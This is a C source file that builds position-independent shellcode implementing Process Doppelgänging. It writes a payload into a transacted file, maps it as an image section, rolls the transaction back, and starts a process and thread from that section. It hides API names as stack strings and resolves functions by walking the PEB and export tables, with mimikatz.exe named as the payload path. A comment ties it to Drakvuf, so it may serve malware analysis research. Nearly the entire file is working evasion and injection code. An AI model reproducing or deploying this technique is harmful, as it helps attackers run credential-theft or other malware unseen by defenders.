#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <Windows.h>
#include <stdio.h>
#include <winnt.h>
#include <UserEnv.h>
#include <processenv.h>
#include <winternl.h>
#include <immintrin.h>

#include "proc_dopp.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "ws2_32.lib")

BOOL my_strcmp(char *s1, char *s2, int length);
int my_wstrlen(PWCHAR str);
int my_strlen(char *str);
HMODULE find_kernel32(void);
FARPROC find_function(HMODULE module, char *name);
ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb);

int __stdcall shellcode(void)
{
    // A bunch of zeros to make room in the payload to be patch with the
    // path provided as argument to Drakvuf.
    // No null-bytes otherwise the assembly generated will be different, there
    // will have 'xor eax, eax' instead of 'mov reg, "char"'. We want the
    // mov instructions to be able to patch.
    WCHAR targetProcess[256] = { '0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                                 '0','0','0','0','0','0','0','0','0','0','0','0','0',
                               };
    BYTE  *lpPayloadBuffer = 0xeeeeeeeeffffffff;
    DWORD STATUS_SUCCESS = 0;
    WCHAR payload[] = { 'C',':','\\','u','s','e','r','s','\\','w','v','b','o','x','\\','d','e','s','k','t','o','p','\\','m','i','m','i','k','a','t','z','.','e','x','e','\0' };
    WCHAR directory[] = { 'C',':','\\','w','i','n','d','o','w','s','\\','s','y','s','t','e','m','3','2','\0' };
    HMODULE hKernel32 = NULL, hNtdll = NULL, hKtmW32 = NULL;
    HANDLE hTransaction = NULL;
    HANDLE hTransactedFile = NULL;
    HANDLE hSection = NULL;
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;
    LPVOID remoteProcParams = NULL;
    MY_PEB remotePeb = { '\0' };
    DWORD payloadSize = 0;
    DWORD bytesWritten = 0;

    PROCESS_BASIC_INFORMATION pbi = { '\0' };
    LPTHREAD_START_ROUTINE remoteEntryPoint = NULL;
    MY_PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
    ULONGLONG offset = 0;
    LPVOID remoteImageBase = NULL;
    UNICODE_STRING uPath = { '\0' };
    UNICODE_STRING uTitle = { '\0' };
    UNICODE_STRING uDirectory = { '\0' };
    UNICODE_STRING uDllPath = { '\0' };

    // Function pointers to kernel functions
    NTSTATUS status = -1;
    NT_CREATE_SECTION _ntCreateSection = NULL;
    NT_CREATE_PROCESS_EX _ntCreateProcessEx = NULL;
    NT_CREATE_THREAD_EX _ntCreateThreadEx = NULL;
    RTL_CREATE_PROCESS_PARAMETERS_EX _rtlCreateProcessParametersEx = NULL;
    NT_QUERY_INFORMATION_PROCESS _ntQueryInformationProcess = NULL;
    NT_WRITE_VIRTUAL_MEMORY _ntWriteVirtualMemory = NULL;
    NT_READ_VIRTUAL_MEMORY _ntReadVirtualMemory = NULL;
    RTL_INIT_UNICODE_STRING _rtlInitUnicodeString = NULL;
    RTL_CREATE_ENVIRONMENT _rtlCreateEnvironment = NULL;
    RTL_CREATE_USER_THREAD _rtlCreateUserThread = NULL;

    // Strings we need on the stack
    char StrNtdll[] = { 'N','t','d','l','l','.','d','l','l','\0' };
    char StrKtmw32[] = { 'k','t','m','w','3','2','.','d','l','l','\0' };
    char StrGetModuleHandleA[] = { 'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A','\0' };
    char StrCreateTransaction[] = { 'C','r','e','a','t','e','T','r','a','n','s','a','c','t','i','o','n','\0' };
    char StrCreateFileTransactedW[] = { 'C','r','e','a','t','e','F','i','l','e','T','r','a','n','s','a','c','t','e','d','W','\0' };
    char StrWriteFile[] = { 'W','r','i','t','e','F','i','l','e','\0' };
    char StrRollbackTransaction[] = { 'R','o','l','l','b','a','c','k','T','r','a','n','s','a','c','t','i','o','n','\0' };
    char StrVirtualAllocEx[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','E','x','\0' };
    char StrLoadLibraryA[] = { 'L','o','a','d','L','i','b','r','a','r','y','A','\0' };
    char StrNtCreateSection[] = { 'N','t','C','r','e','a','t','e','S','e','c','t','i','o','n','\0' };
    char StrNtCreateProcessEx[] = { 'N','t','C','r','e','a','t','e','P','r','o','c','e','s','s','E','x','\0' };
    char StrRtlCreateProcessParametersEx[] = { 'R','t','l','C','r','e','a','t','e','P','r','o','c','e','s','s','P','a','r','a','m','e','t','e','r','s','E','x','\0' };
    char StrRtlInitUnicodeString[] = { 'R','t','l','I','n','i','t','U','n','i','c','o','d','e','S','t','r','i','n','g','\0' };
    char StrNtWriteVirtualMemory[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
    char StrNtQueryInformationProcess[] = { 'N','t','Q','u','e','r','y','I','n','f','o','r','m','a','t','i','o','n','P','r','o','c','e','s','s','\0' };
    char StrNtReadVirtualMemory[] = { 'N','t','R','e','a','d','V','i','r','t','u','a','l','M','e','m','o','r','y','\0' };
    char StrNtCreateThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x','\0' };
    char StrGetLastError[] = { 'G','e','t','L','a','s','t','E','r','r','o','r','\0' };

    // Pointers to functions retrieved dynamically
    FARPROC _getModuleHandleA = NULL, _createTransaction = NULL, _createFileTransactedW = NULL, _writeFile = NULL;
    FARPROC _rollbackTransaction = NULL, _virtualAllocEx = NULL, _loadLibraryA = NULL, _getLastError = NULL;

    // Load needed DLLs
    hKernel32 = find_kernel32();
    _getModuleHandleA = find_function(hKernel32, StrGetModuleHandleA);
    _loadLibraryA = find_function(hKernel32, StrLoadLibraryA);
    _getLastError = find_function(hKernel32, StrGetLastError);
    hNtdll = _getModuleHandleA(StrNtdll);
    hKtmW32= _loadLibraryA(StrKtmw32);

    // Create a transaction.
    _createTransaction = find_function(hKtmW32, StrCreateTransaction);
    if (!_createTransaction)
        goto error;
    hTransaction = _createTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
    if (INVALID_HANDLE_VALUE == hTransaction)
        goto error;

    // Open a transacted file (the target clean process).
    _createFileTransactedW = find_function(hKernel32, StrCreateFileTransactedW);
    if (!_createFileTransactedW)
        goto error;
    hTransactedFile = _createFileTransactedW(
                          targetProcess,
                          GENERIC_READ | GENERIC_WRITE,
                          0,
                          NULL,
                          CREATE_ALWAYS,
                          FILE_ATTRIBUTE_NORMAL,
                          NULL,
                          hTransaction,
                          NULL,
                          NULL
                      );
    if (INVALID_HANDLE_VALUE == hTransactedFile)
        goto error;

    //lpPayloadBuffer = file_to_buffer(payload, &payloadSize);
    //if (!lpPayloadBuffer)
    //	goto error;
    //printf("Size of the payload buffer : %d\n", payloadSize);
    //printf("Buffer : \n%s\n", lpPayloadBuffer);

    // Overwrite the opened file with malicious code.
    _writeFile = find_function(hKernel32, StrWriteFile);
    if (!_writeFile)
        goto error;
    _writeFile(hTransactedFile, lpPayloadBuffer, payloadSize, &bytesWritten, NULL);

    // Create the section in the target process.
    _ntCreateSection = (NT_CREATE_SECTION)find_function(hNtdll, StrNtCreateSection);
    //printf("Address of NtCreateSection(): %p\n", _ntCreateSection);
    status = -1;
    if (_ntCreateSection)
    {
        status = _ntCreateSection(
                     &hSection,
                     SECTION_ALL_ACCESS,
                     NULL,
                     0,
                     PAGE_READONLY,
                     SEC_IMAGE,
                     hTransactedFile
                 );
    }
    if (STATUS_SUCCESS != status)
        goto error;

    // Rollback the transaction to remove our changes from the file system.
    _rollbackTransaction = find_function(hKtmW32, StrRollbackTransaction);
    if (!_rollbackTransaction)
        goto error;
    if (!_rollbackTransaction(hTransaction))
        goto error;

    // Create a new process to wrap the previously created section.
    _ntCreateProcessEx = (NT_CREATE_PROCESS_EX)find_function(hNtdll, StrNtCreateProcessEx);
    //printf("Address of NtCreateProcessEx(): %p\n", _ntCreateProcessEx);
    status = -1;
    if (_ntCreateProcessEx)
    {
        status = _ntCreateProcessEx(
                     &hProcess,
                     PROCESS_ALL_ACCESS,
                     NULL,
                     ((HANDLE)-1), // Current process
                     PS_INHERIT_HANDLES,
                     hSection,
                     NULL,
                     NULL,
                     FALSE
                 );
    }
    if (STATUS_SUCCESS != status)
        goto error;

    // Create the parameters for that process.
    _rtlCreateProcessParametersEx = (RTL_CREATE_PROCESS_PARAMETERS_EX)find_function(hNtdll, StrRtlCreateProcessParametersEx);
    _rtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)find_function(hNtdll, StrRtlInitUnicodeString);
    if (!_rtlInitUnicodeString)
        goto error;
    //printf("Address of RtlCreateProcessParameters(): %p\n", _rtlCreateProcessParametersEx);
    //printf("Address of RtlInitUnicodeString(): %p\n", _rtlInitUnicodeString);

    _rtlInitUnicodeString(&uPath, targetProcess);
    _rtlInitUnicodeString(&uDirectory, directory);
    //_rtlInitUnicodeString(&uTitle, L"notepad.exe");

    status = -1;
    if (_rtlCreateProcessParametersEx)
    {
        status = _rtlCreateProcessParametersEx(
                     &processParameters,
                     &uPath,
                     &uDllPath,
                     &uDirectory,
                     &uPath,
                     NULL,
                     NULL, //&uTitle,
                     NULL,
                     NULL,
                     NULL,
                     RTL_USER_PROC_PARAMS_NORMALIZED
                 );
    }
    if (STATUS_SUCCESS != status)
        goto error;

    // Allocate enough memory in the remote process' address space to write the
    // process parameters pointer into it.
    _virtualAllocEx = find_function(hKernel32, StrVirtualAllocEx);
    if (!_virtualAllocEx)
        goto error;
    remoteProcParams = _virtualAllocEx(
                           hProcess,
                           processParameters,
                           processParameters->Length,
                           MEM_COMMIT | MEM_RESERVE,
                           PAGE_READWRITE
                       );
    if (!remoteProcParams)
        goto error;

    // Write the parameters to the remote process.
    _ntWriteVirtualMemory = (NT_WRITE_VIRTUAL_MEMORY)find_function(hNtdll, StrNtWriteVirtualMemory);
    //printf("Address of NtWriteVirtualMemory() : %p\n", _ntWriteVirtualMemory);
    status = _ntWriteVirtualMemory(
                 hProcess,
                 processParameters,
                 processParameters,
                 processParameters->Length,
                 NULL
             );
    if (STATUS_SUCCESS != status)
        goto error;

    // Get remote process' PEB address.
    _ntQueryInformationProcess = (NT_QUERY_INFORMATION_PROCESS)find_function(hNtdll, StrNtQueryInformationProcess);
    status = -1;
    if (_ntQueryInformationProcess)
    {
        status = _ntQueryInformationProcess(
                     hProcess,
                     ProcessBasicInformation,
                     &pbi,
                     sizeof(PROCESS_BASIC_INFORMATION),
                     NULL
                 );
    }
    if (STATUS_SUCCESS != status)
        goto error;

    // Read the memory of the target process to be able to fetch its image base address.
    _ntReadVirtualMemory = (NT_READ_VIRTUAL_MEMORY)find_function(hNtdll, StrNtReadVirtualMemory);
    //printf("Address of NtReadVirtualMemory() : %p\n", _ntReadVirtualMemory);
    status = -1;
    if (_ntReadVirtualMemory)
    {
        status = _ntReadVirtualMemory(
                     hProcess,
                     pbi.PebBaseAddress,
                     &remotePeb,
                     sizeof(MY_PEB),
                     NULL
                 );
    }
    if (STATUS_SUCCESS != status)
        goto error;
    //printf("remotePeb.ImageBaseAddress : %p\n", remotePeb.ImageBaseAddress);

    // Overwrite remote process' ProcessParameters pointer to point to the one we
    // created.
    //printf("remotePeb.ProcessParameters (before) : %p\n", remotePeb.ProcessParameters);
    offset = (ULONGLONG)&remotePeb.ProcessParameters - (ULONGLONG)&remotePeb;
    remoteImageBase = (LPVOID) ( (ULONGLONG)pbi.PebBaseAddress + offset);
    status = _ntWriteVirtualMemory (
                 hProcess,
                 remoteImageBase,
                 &processParameters,
                 sizeof(PVOID),
                 NULL
             );
    if (STATUS_SUCCESS != status)
        goto error;

    // Get remote process' entry point to let the main thread knows where to start.
    remoteEntryPoint = (LPTHREAD_START_ROUTINE)get_entry_point(lpPayloadBuffer, &remotePeb);
    if (!remoteEntryPoint)
        goto error;

    // Create the main thread for the new process.
    _ntCreateThreadEx = (NT_CREATE_THREAD_EX)find_function(hNtdll, StrNtCreateThreadEx);
    //printf("Address of NtCreateThreadEx(): %p\n", _ntCreateThreadEx);
    status = 0;
    if (_ntCreateThreadEx)
    {
        status = _ntCreateThreadEx(
                     &hThread,
                     THREAD_ALL_ACCESS,
                     NULL,
                     hProcess,
                     remoteEntryPoint,
                     NULL,
                     FALSE,
                     0,
                     0,
                     0,
                     NULL
                 );
    }
    if (STATUS_SUCCESS != status)
        goto error;

    return 0;

error:
    _getLastError();
    return -1;
}

/*
 * Open a file and read its content to copy it into memory.
 * Returns a pointer to the allocated buffer, and its size in the corresponding parameter.
 *
LPVOID file_to_buffer(LPWSTR payload, LPDWORD payloadSize)
{
	HANDLE hPayloadFile;
	HANDLE hHeap;
	LPVOID lpPayloadBuffer;
	DWORD bytesRead = 0;

	HMODULE hKernel32 = NULL;
	FARPROC	_createFileW = NULL, _getFileSizeEx = NULL, _getProcessHeap = NULL, _virtualAlloc = NULL;
	FARPROC _readFile = NULL, _closeHandle = NULL;
	char StrCreateFileW[] = { 'C','r','e','a','t','e','F','i','l','e','W','\0' };
	char StrGetFileSizeEx[] = { 'G','e','t','F','i','l','e','S','i','z','e','E','x','\0' };
	char StrGetProcessHeap[] = { 'G','e','t','P','r','o','c','e','s','s','H','e','a','p','\0' };
	char StrVirtualAlloc[] = { 'V','i','r','t','u','a','l','A','l','l','o','c','\0' };
	char StrReadFile[] = { 'R','e','a','d','F','i','l','e','\0' };
	char StrCloseHandle[] = { 'C','l','o','s','e','H','a','n','d','l','e','\0' };

	hKernel32 = find_kernel32();
	_createFileW = find_function(hKernel32, StrCreateFileW);
	_getFileSizeEx = find_function(hKernel32, StrGetFileSizeEx);
	_getProcessHeap = find_function(hKernel32, StrGetProcessHeap);
	_virtualAlloc = find_function(hKernel32, StrVirtualAlloc);
	_readFile = find_function(hKernel32, StrReadFile);
	_closeHandle = find_function(hKernel32, StrCloseHandle);

	// Open the payload file.
	hPayloadFile = _createFileW(
		payload,
		GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (INVALID_HANDLE_VALUE == hPayloadFile)
		return NULL;

	if (!_getFileSizeEx(hPayloadFile, payloadSize))
		return NULL;

	// Allocate memory for the file.
	if ( !(hHeap = _getProcessHeap()) )
		return NULL;

	//lpPayloadBuffer = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, *payloadSize);
	lpPayloadBuffer = _virtualAlloc(NULL, *payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!lpPayloadBuffer)
		return NULL;

	// Put file content into memory.
	if (!_readFile(hPayloadFile, lpPayloadBuffer, *payloadSize, &bytesRead, NULL))
		return NULL;

	_closeHandle(hPayloadFile);

	return lpPayloadBuffer;
}
*/

ULONGLONG get_entry_point(BYTE *lpPayloadBuffer, MY_PPEB remotePeb)
{
    IMAGE_DOS_HEADER *dosHeader = NULL;
    IMAGE_NT_HEADERS64 *peHeader = NULL;
    ULONGLONG entryPoint = NULL;
    ULONGLONG imageBase = NULL;
    DWORD offset = 0;

    // NT header is located at base_dos_header + offset_PE_header (roffsetresented by
    // 'e_lfanew'.
    // Source : PE file format compendium 1.1 (by Goppit).
    dosHeader = (IMAGE_DOS_HEADER*)lpPayloadBuffer;
    if (IMAGE_DOS_SIGNATURE != dosHeader->e_magic)
        return 0;

    peHeader = (IMAGE_NT_HEADERS64*)(lpPayloadBuffer + dosHeader->e_lfanew);
    if (IMAGE_NT_SIGNATURE != peHeader->Signature)
        return 0;

    // The entry point address is the addition of the base address of the process
    // (got from the PEB structure filled with NtQueryInformationProcess, the one
    // present in the optional header is just the preferred base address and can
    // be different from the real base address) and the offset of the entry point
    // (from the image base) present in the OptionalHeader.
    imageBase = (ULONGLONG)remotePeb->ImageBaseAddress;
    offset = peHeader->OptionalHeader.AddressOfEntryPoint;
    //printf("imageBase : %p\n", imageBase);
    //printf("offset : %d\n", offset);

    entryPoint = imageBase + offset;

    return entryPoint;
}


/**************************************************************************************
 * Utility functions needed to create a position independent shellcode.				  *
 *																					  *
 * More details about some of these function can be found at :						  *
 *	https://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/ *
 *																					  *
 **************************************************************************************/

/*
 * Case insensitive string comparison.
 */
BOOL my_strcmp(char *s1, char *s2, int length)
{
    int x = 0;

    if (!s1 || !s2)
        return 0;

    for (int i = 0; i <= length; i++)
    {
        x = s1[i] - s2[i];

        // 0x20 is the difference between an upper and a lower case in the
        // ASCII table.
        if ((x != 0) && (x != -0x20) && (x != 0x20))
            return 1;
    }

    return 0;
}

/*
 * Count the number of char in a unicode string.
 */
int my_wstrlen(PWCHAR str)
{
    int len = 0;

    for (len; (str[len] != '\0') && (str[len + 1] != '\0'); len++);

    return len;
}

int my_strlen(char *str)
{
    int len = 0;

    for (len; str[len] != '\0'; len++);

    return len;
}

HMODULE find_kernel32(void)
{
    PPEB peb = NULL;
    LDR_DATA_TABLE_ENTRY *module_ptr = NULL, *first_mod = NULL;
    WCHAR str[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', '\0'  };

    // Get PEB
    peb = __readgsqword(0x60);

    module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
    first_mod = module_ptr;

    do
    {
        if ( !my_strcmp(module_ptr->FullDllName.Buffer, str, my_wstrlen(str) << 1) )
        {
            //w//printf(L"[+] kernel32.dll found at: 0x%p\n", module_ptr->Reserved2[0]);
            return (HMODULE)module_ptr->Reserved2[0];
        }

        module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];
    }
    while (module_ptr && module_ptr != first_mod);

    return NULL;
}

FARPROC find_function(HMODULE module, char *name)
{
    IMAGE_DOS_HEADER *dos_header = NULL;
    IMAGE_NT_HEADERS *nt_headers = NULL;
    IMAGE_EXPORT_DIRECTORY *export_dir = NULL;
    WORD *nameords = NULL;
    int *names = NULL, *funcs = NULL;
    int i = 0;

    dos_header = (IMAGE_DOS_HEADER *)module;
    nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
    export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    names = (int *)((char*)module + export_dir->AddressOfNames);
    funcs = (int *)((char*)module + export_dir->AddressOfFunctions);
    nameords = (WORD *)((char*)module + export_dir->AddressOfNameOrdinals);

    for (i = 0; i < export_dir->NumberOfNames; i++)
    {
        char *str = (char *)module + names[i];
        int length = my_strlen(name);

        if (!my_strcmp(str, name, length))
        {
            WORD nameord = nameords[i];
            int funcrva = funcs[nameord];
            ////printf("[+] function %s found at: 0x%p\n", str, (char*)module + funcrva);
            return (FARPROC)((char*)module + funcrva);
        }
    }

    return NULL;
}

void __declspec() END_SHELLCODE(void) {}

int main(void)
{
    FILE *output = NULL;

    shellcode();
    puts("[+] Starting..");
    output = fopen("doppelganging_dbg.bin", "wb");
    fwrite(shellcode, (int)END_SHELLCODE - (int)shellcode, 1, output);
    fclose(output);
    puts("[+] Done!");

    getchar();

    return 0;
}